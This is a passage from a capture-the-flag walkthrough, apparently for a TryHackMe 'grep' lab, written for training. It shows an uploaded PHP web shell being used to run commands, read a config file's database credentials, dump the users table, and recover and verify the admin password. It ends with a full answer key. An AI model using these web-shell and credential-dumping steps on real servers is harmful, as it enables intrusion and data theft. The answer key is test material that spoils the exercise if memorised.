`[http 200]` is the gate. Anything else — an error, an empty body, a non-200 — means go back to §6.3
or §6.4/§6.5, not forward to §6.7.

### 6.7 Trigger the shell — Remote Code Execution

Uploaded files land in `/api/uploads/`. Run a command through it:

```bash
curl -sk --resolve grep.thm:443:10.129.164.123 'https://grep.thm/api/uploads/p0wn.php?c=id'
#   uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- `?c=id` — sets the `c` parameter (read by `$_REQUEST['c']`) to the command `id`. `id` prints the
  current user — the classic "did my shell work?" test. Output shows **`www-data`**: we have RCE as
  the web server user.
- Note the URL is **quoted** in single quotes so the shell doesn't interpret `?`/`&`.

**The binary garbage before `uid=33` is the proof, not noise.** Everything outside `<?php … ?>` is
emitted verbatim by PHP, so the PNG bytes print first and *then* your command output. Seeing image
bytes followed by `uid=…` is confirmation that the polyglot survived upload intact and that the
server parsed it as PHP. Three outcomes to distinguish:

| What comes back | Meaning |
|---|---|
| PNG bytes, then `uid=33(www-data)` | **RCE.** Move on. |
| The whole file dumped as text/image | Served but **not executed** — the upload dir doesn't run PHP |
| `404` | Wrong path, or the app renamed the file — go find the real name |

### 6.8 Loot the database

You have RCE. The goal now is the **admin user's row** in the database — that's where the admin email
(Question 3) lives. Getting there is four small steps, and none of them is a leap:

1. Find out **which** database the app uses, and the **credentials** to open it.
2. Try the obvious tool (`mysql` command line) — and watch it fail, so you learn *why*.
3. Query the database **through PHP instead**, because PHP is what you already have running.
4. Read the `users` table and pull the admin row.

Take them one at a time.

**Step 1 — where are the DB credentials?** Almost every PHP app keeps them in a `config.php` (or
`db.php`, `.env`) next to the code. You already read the app's source on GitHub, so you know the file
exists. Read the *live* copy through your shell — the live one has the real password; GitHub's copy
often has a placeholder:

```bash
curl -sk --resolve grep.thm:443:10.129.164.123 \
  'https://grep.thm/api/uploads/p0wn.php?c=cat%20/var/www/html/api/config.php'
#   $servername = "localhost";
#   $username   = "root";
#   $password   = "password";
#   $dbname     = "postman";
```

- `c=cat%20/var/www/html/api/config.php` — the command your web shell runs is
  `cat /var/www/html/api/config.php`. `cat` prints a file to the screen; `%20` is a URL-encoded
  space (a raw space would break the URL). This is the same `?c=` trick as §6.7, just running `cat`
  instead of `id`.

So the app talks to a MySQL database called **`postman`**, as user **`root`** with password
**`password`**. Four facts — host, user, password, db name — and that's everything you need to open
it.

**Step 2 — the obvious way, and why it doesn't work here.** The natural move is the `mysql` command
line, straight through the web shell:

```bash
curl -sk --resolve grep.thm:443:10.129.164.123 \
  'https://grep.thm/api/uploads/p0wn.php?c=mysql%20-uroot%20-ppassword%20postman%20-e%20%22SELECT%20*%20FROM%20users%22'
#   sh: 1: mysql: not found
```

`mysql: not found` — the MySQL *client binary* isn't installed on this server (only the server-side
database engine is). This is common: a box runs the database but never installs the interactive
client, because the app talks to MySQL through a PHP library, not the command line. **Don't fight
it** — pivot to the tool the app itself uses.

> **PT1 takeaway:** when a command line tool is missing, ask "how does the application connect?" and
> use *that* path. Here the app uses PHP's `mysqli`, and you can run PHP, so you have everything you
> need.

**Step 3 — query the database from PHP.** Instead of a command, upload a *second* small PHP script
whose whole job is: connect to MySQL with the creds from Step 1, run one `SELECT`, and print the
rows. Build it exactly like the web shell in §6.2 — PNG bytes first so it passes the upload check,
then the PHP:

```bash
python3 - <<'PY'
png = b"\x89PNG\r\n\x1a\n"
php = b'''<?php
$c = new mysqli("localhost", "root", "password", "postman");   // creds from config.php
if ($c->connect_error) { die("CONNECT FAIL: " . $c->connect_error); }
$res = $c->query("SELECT * FROM users");                        // read the whole users table
while ($row = $res->fetch_assoc()) { echo json_encode($row) . "\\n"; }  // one JSON line per user
'''
open("dump.php", "wb").write(png + php)
PY
xxd dump.php | head -1     # confirm it still starts 8950 4e47 (PNG) — same rule as always
```

Line by line, in plain terms:
- `new mysqli("localhost", "root", "password", "postman")` — open a connection to the database.
  The four arguments are exactly the four facts from `config.php`: host, username, password, db name.
  `mysqli` is PHP's built-in MySQL client — no install needed, it's part of PHP.
- `if ($c->connect_error) …` — if the connection fails, print *why* and stop. Always include this;
  a silent failure is the §6.4 trap all over again.
- `query("SELECT * FROM users")` — ask MySQL for every row of the `users` table. `SELECT *` means
  "all columns"; `FROM users` names the table. (We guessed `users` — it's the standard name. If it
  were wrong you'd first run `SHOW TABLES` the same way.)
- `while ($row = $res->fetch_assoc())` — walk the result one row at a time. `fetch_assoc()` hands
  back each row as a name→value array (`{"username": "...", ...}`).
- `echo json_encode($row) . "\n"` — print each row as a line of JSON, so the output is easy to read.

Upload it with the working syntax from §6.6 (note the `@`, and set `$S`/`$SID` first):

```bash
curl -sSk -w '\n[http %{http_code}]\n' --resolve grep.thm:443:10.129.164.123 \
     -X POST https://grep.thm/api/upload.php \
     -b "PHPSESSID=$SID" -F "file=@dump.php;filename=dump.php;type=image/png"
#   {"message":"File uploaded successfully."}
```

**Step 4 — run it and read the users table.** Just request the uploaded file, exactly like the web
shell. This one takes no `?c=` — the query is baked into the script, so loading the URL *is* running
the query:

```bash
curl -sk --resolve grep.thm:443:10.129.164.123 https://grep.thm/api/uploads/dump.php
```

The PNG header prints as garbage first (expected — §6.7), then the rows:

```json
{"id":"1","username":"admin",
 "password":"$2y$10$zEVsOgLNysASz4SLKPJGMOthL4K8QFQK3ntnW8EVtVXCcbrGSM/Y6",
 "email":"admin@searchme2023cms.grep.thm","name":"Admin User","role":"admin"}
```

There it is: the `admin` row, with the email you need and — for later — the password hash.

> **Shortcut (once you're comfortable):** you don't strictly need a second file. The web shell from
> §6.7 can run PHP inline with `php -r '<code>'`, so a single URL does the whole job:
>
> ```bash
> curl -sk --resolve grep.thm:443:10.129.164.123 --data-urlencode \
>   'c=php -r '\''$c=new mysqli("localhost","root","password","postman");$r=$c->query("SELECT username,email,role FROM users");while($x=$r->fetch_assoc())echo json_encode($x),"\n";'\''' \
>   'https://grep.thm/api/uploads/p0wn.php'
> ```
>
> `--data-urlencode` (with the URL as the last argument) safely encodes all the quotes and spaces
> for you. The separate-file approach above is clearer while learning; this is faster once the moving
> parts make sense.

### ✅ Question 3 — Admin email: `admin@searchme2023cms.grep.thm`

> **Read the password column carefully:** `$2y$10$...` is a **bcrypt** hash (the `$2y$` prefix =
> bcrypt, `10` = cost factor). It's *not* plaintext and *not* fast to crack. You *could* run
> `hashcat -m 3200 hash.txt rockyou.txt` (`-m 3200` = bcrypt), but bcrypt is deliberately slow, so
> only a weak password would fall in reasonable time. This room gives a cleaner path — the leak
> checker — which is the intended solution.

---

## 7. Recover the admin password (Question 5)

Now that you have the admin's *real* email, feed it to the leak checker that stonewalled you earlier:

```bash
curl -sk --resolve leakchecker.grep.thm:51337:10.129.164.123 \
  -X POST https://leakchecker.grep.thm:51337/check_email.php \
  --data-urlencode 'email=admin@searchme2023cms.grep.thm'
#   Password: admin_tryhackme!
```

Same flags as §5.1 — the only change is the correct email, and this time the service returns the
leaked password in plaintext.

### ✅ Question 5 — Admin password: `admin_tryhackme!`

### Verify it two ways (never trust a single source)

**1) It logs in as admin** — the definitive test:

```bash
curl -sk --resolve grep.thm:443:10.129.164.123 -X POST https://grep.thm/api/login.php \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin_tryhackme!"}'
#   {"message":"Login successful.","role":"admin"}
```

**2) It matches the bcrypt hash from the DB** — proves the leak checker didn't lie:

```bash
python3 -c "import bcrypt; print(bcrypt.checkpw(b'admin_tryhackme!', b'\$2y\$10\$zEVsOgLNysASz4SLKPJGMOthL4K8QFQK3ntnW8EVtVXCcbrGSM/Y6'))"
#   True
```

- `python3 -c "..."` — run a one-line Python program (`-c` = "run this code string").
- `bcrypt.checkpw(password, hash)` — hashes the candidate password with the same salt/cost embedded
  in the stored hash and compares. `True` = the password *is* the one behind that hash.
- The `\$` are escaped so the shell doesn't treat `$2`, `$10` as variables.

Both agree → confirmed. Log in as `admin` and you reach `admin.php` (post management), completing the
privilege step from `user` to `admin`.

---

## 8. Vulnerability summary — name each one (exam-style)

| Phase | Finding | Root cause | Fix |
|-------|---------|------------|-----|
| OSINT | Live API key in Git history | "Removing" a secret in a new commit leaves it in history | Rotate exposed secrets; scan repos with gitleaks/trufflehog; never commit secrets |
| Enumeration | API key shipped in client JS | Anything sent to the browser is public | Keep secrets server-side |
| Exploitation | Insecure file upload → RCE | Magic-byte-only check + original filename kept + executable dir | Validate type *and* force a safe extension; store outside webroot; disable PHP execution in upload dir |
| Post-exploitation | DB creds in `config.php`, `root`/`password` | Weak, reused DB credentials readable by web user | Least-privilege DB user; strong secrets; file perms |
| Business logic | Leak checker returns plaintext password | Passwords stored/retrievable in plaintext somewhere | Never store recoverable passwords; the tool leaks its own admin creds |

**Attack chain in one sentence:** OSINT (leaked key) → register → authenticate → find insecure
upload in public source → upload PHP-with-PNG-header → RCE → read DB → get admin email → leak checker
hands over the admin password.

---

## 9. Cleanup — be a good guest (and it's exam etiquette)

Remove artifacts you dropped:

```bash
curl -sk --resolve grep.thm:443:10.129.164.123 \
  'https://grep.thm/api/uploads/p0wn.php?c=rm%20/var/www/html/api/uploads/p0wn.php'
```

- `c=rm%20...` — runs `rm <path>` (delete the file) via the same web shell, then it deletes itself.
  Confirm with a follow-up request that now returns `404`.

---

## Appendix A — full answer key

```
Q1  API key (register):   ffe60ecaa8bba2f12b43d1a4b15b8f39
Q2  First flag:           THM{[redacted]}
Q3  Admin email:          admin@searchme2023cms.grep.thm
Q4  Leak-checker host:    leakchecker.grep.thm
Q5  Admin password:       admin_tryhackme!
```

## Appendix B — curl flags cheat-sheet (memorize these for PT1)

| Flag | Meaning | When you need it |
|------|---------|------------------|
| `-s` | silent — hides the progress bar **and error messages** | clean output, but see `-sS` |
| `-sS` | silent but still show errors | **make this your default** — see §6.4 |
| `-w '%{http_code}'` | print status / upload size after the body | telling "empty response" from "never sent" |
| `-k` | accept invalid/self-signed TLS | any HTTPS lab box |
| `-i` | include response headers | to read `Set-Cookie`, redirects, status |
| `-X METHOD` | set HTTP method | POST/PUT/DELETE APIs |
| `-H 'K: V'` | add a header | JSON content-type, API keys, Host |
| `-d 'data'` | request body (implies POST) | sending JSON/form data |
| `--data-urlencode 'k=v'` | body, value URL-encoded | values with `@ + &` etc. (emails!) |
| `-b 'k=v'` | send cookies | authenticated requests |
| `--resolve host:port:ip` | pin hostname→IP for this request | vhosts without editing `/etc/hosts` |
| `-F 'file=@path'` | multipart file upload | upload forms |
| `-L` | follow redirects | when a page 302s to the real content |

## Appendix C — the methodology, generalised

1. **Recon** — `nmap -p- --min-rate 2000 -T4 -Pn`, then `-sV -sC -p <open>`. Read certs, titles,
   redirects.
2. **Enumeration** — browse the app, read every JS file, note endpoints/roles, fuzz for hidden
   paths (`ffuf`/`gobuster`), check for source leaks (GitHub, `.git`, backups).
3. **Exploitation** — cross a trust boundary: leaked secret, injection, insecure upload, auth flaw.
4. **Post-exploitation** — read configs, dump DBs, pivot users/roles, escalate.
5. **Verify & report** — confirm each finding by a second method; separate *verified* from
   *assumed*; keep the dead ends as lessons.

## Appendix D — the five dead ends, and what each one teaches

| § | Symptom | Real cause | Rule extracted |
|---|---------|------------|----------------|
| 2.2 | `Invalid or Expired API key` | key in client JS is a decoy | secrets in front-end code are suspect; pivot to OSINT |
| 5.1 | `Invalid email!` on every guess | means "not in my leak DB", not "malformed" | confirm what an error *means* with known-good vs known-bad input |
| 6.3 | `Invalid file type` | payload bytes were not a structurally valid PNG (`finfo` ≠ `getimagesize`) | recreate the check locally, then run a one-variable-at-a-time differential |
| 6.4 | **no output at all** | `$S` unset + `-s` swallowing curl error 26 | silence is not success; use `-sS` and check `$?` |
| 6.5 | `No file uploaded` | `-F` without `@` — sent the filename as a string, not the file | when the server says a field is missing, inspect the bytes you actually sent |

The 6.4 one is the most dangerous of the four, because the other three *look* like failures. An
empty response looks like a clean run, and you'll happily spend twenty minutes hunting for an
uploaded file that was never sent.

*All commands were run against `10.129.164.123` on 2026-08-22. Replace the IP with your own lab
machine. No local privilege escalation was required — this box is web + OSINT end to end.*
